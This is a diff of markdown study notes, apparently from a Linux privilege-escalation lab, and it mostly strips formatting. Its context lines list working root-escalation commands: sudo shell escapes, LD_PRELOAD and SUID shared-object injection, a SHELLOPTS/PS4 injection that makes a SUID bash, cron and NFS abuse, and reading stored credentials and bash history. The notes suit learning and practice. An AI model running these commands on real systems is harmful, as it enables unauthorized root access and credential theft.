@@ -1,11 +1,6 @@
-# IP Address
-''''
-10.10.75.233
-
-''''
 
 # Tools
-''''
+
 1. dirtycow
 2. exim
 3. linenum
@@ -15,10 +10,7 @@
 7. nginx
 8. source_files
 
-''''
-
 # 1. Privilage Escalation- Kernel Exploit
-''''
 ## Detection
 1. `linux-exploit-suggester.sh `	{ suggests the expolits with cve }	>> vulnerable to dirtycow
 
@@ -29,10 +21,8 @@
 
 3. `passwd`		>> root shell
 
-''''
-
 # 2. Privilage Escalation - Stored Passwords (config files)
-''''
+
 1. In command prompt type: `cat /home/user/myvpn.ovpn`
 2. From the output, make note of the value of the “auth-user-pass” directive.
 3. In command prompt type: `cat /etc/openvpn/auth.txt`
@@ -40,18 +30,10 @@
 5. In command prompt type: `cat /home/user/.irssi/config | grep -i passw`
 6. From the output, make note of the clear-text credentials.
 
-''''
-
 # 3. Privilage Escalaction - Stored Passwords ( history )
-''''
-```
-command : cat ~/.bash_history | grep -i passw
-```
-
-''''
+command : `cat ~/.bash_history | grep -i passw`
 
 # 4. Privilage Escalation - Weak File Permissions
-''''
 ## Detection
 1. `ls -la /etc/shadow `		>> note the file permissions
 `-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow`
@@ -73,7 +55,6 @@ Now:
 ''''
 
 # 5. Privilage Escalation - SSH Keys
-''''
 ## Detection
 1. In command prompt type:
 `find / -name authorized_keys 2> /dev/null`
@@ -91,10 +72,7 @@ Now:
 1. In command prompt type: `chmod 400 id_rsa`
 2. In command prompt type: `ssh -i id_rsa root@<ip>`
 
-''''
-
 # 6. Privilage Escalation - Sudo ( Shell Escaping )
-''''
 ## Detection
 1. In command prompt type: `sudo -l`
 2. From the output, notice the list of programs that can run via sudo. 
@@ -106,10 +84,7 @@ b. `sudo awk 'BEGIN {system("/bin/sh")}'`
 c. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
 d. `sudo vim -c '!sh' `
 
-''''
-
 # 7. Privilage Escalation - Sudo (Abusing Intended Functionality)
-''''
 ## Detection
 
 <target box>
@@ -133,11 +108,7 @@ d. `sudo vim -c '!sh' `
 `john --wordlist=/usr/share/wordlists/nmap.lst hash.txt`
 3. From the output, notice the cracked credentials.
 
-
-''''
-
 # 8. Privilage Escalation - Sudo (LD_PRELOAD) 
-''''
 ## Detection
 
 <target box>
@@ -167,11 +138,7 @@ void _init() {
 `sudo LD_PRELOAD=/tmp/x.so apache2`
 5. In command prompt type: `id`
 
-
-''''
-
 # 9. Privilage Escalation -  SUID (Shared Object Injection)
-''''
 ## Detection
 
 <target box>
@@ -205,10 +172,7 @@ void inject() {
 10. In command prompt type: `/usr/local/bin/suid-so`
 11. In command prompt type: `id`
 
-''''
-
 # 10. Privilage Escalation -  SUID (Symlinks)
-''''
 ## Detection
 
 <target box>
@@ -238,10 +202,7 @@ void inject() {
 1. From the output, notice that the exploit continued its execution.
 2. In command prompt type: id
 
-''''
-
 # 11. Privilage Escalation -  SUID (Environment Variables #1) 
-''''
 ## Detection
 
 <target box>
@@ -262,10 +223,7 @@ void inject() {
 4. In command prompt type: `/usr/local/bin/suid-env`
 5. In command prompt type: `id`
 
-''''
-
 # 12. Privilage Escalation - SUID (Environment Variables #2)
-''''
 ## Detection
 
 <target box>
@@ -292,10 +250,7 @@ void inject() {
 1. In command prompt type:
 `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`
 
-''''
-
 # 13. Privilage Escalation - Capabilities
-''''
 ## Detection
 
 <target box>
@@ -311,10 +266,7 @@ Exploitation
 `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
 2. Enjoy root!
 
-''''
-
 # 14. Privilage Escalation - Cron (Path) 
-''''
 ## Detection
 
 <target box>
@@ -333,10 +285,7 @@ Exploitation
 4. In command prompt type: `/tmp/bash -p`
 5. In command prompt type: `id`
 
-''''
-
 # 15. Privilage Escalation - Corn (Wildcards) 
-''''
 ## Detection
 
 <target box>
@@ -358,10 +307,7 @@ Exploitation
 5. In command prompt type: `/tmp/bash -p`
 6. In command prompt type: `id`
 
-''''
-
 # 16. Privilage Escalation - Corn (File Overwrite)
-''''
 ## Detection
 
 <target box>
@@ -381,10 +327,7 @@ Exploitation
 3. In command prompt type: `/tmp/bash -p`
 4. In command prompt type: `id`
 
-''''
-
 # 17. Privilage Escalation - NFS Root Squashing
-''''
 ## Detection
 
 <target box>
@@ -408,5 +351,3 @@ In command prompt type:
 
 1. In command prompt type: `/tmp/x`
 2. In command prompt type: `id`
-
-''''
